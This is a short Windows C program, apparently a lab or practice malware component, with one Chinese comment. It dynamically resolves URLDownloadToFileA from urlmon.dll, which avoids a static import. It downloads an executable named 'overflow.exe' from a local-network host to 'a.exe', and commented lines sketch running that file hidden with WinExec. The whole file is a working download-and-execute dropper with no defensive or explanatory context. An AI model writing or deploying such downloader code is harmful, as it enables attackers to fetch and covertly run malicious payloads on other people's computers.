#include<Windows.h>
#include<urlmon.h>

typedef int(WINAPI *MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

int main()
{
	HMODULE hurlmod = LoadLibrary("urlmon.dll");//urlmon默认不加载，需要手动加载
	MY_DOWNLOAD_PROC function_ptr = 
		(MY_DOWNLOAD_PROC)GetProcAddress(hurlmod, "URLDownloadToFileA");
	function_ptr(NULL, "http://192.168.56.1:8000/overflow.exe", "a.exe", 0, NULL);
	//URLDownloadToFile(NULL, "http://baidu.com", "a.html", 0, NULL);
	//CreateProcess
	//WinExec("a.exe", SW_HIDE);
}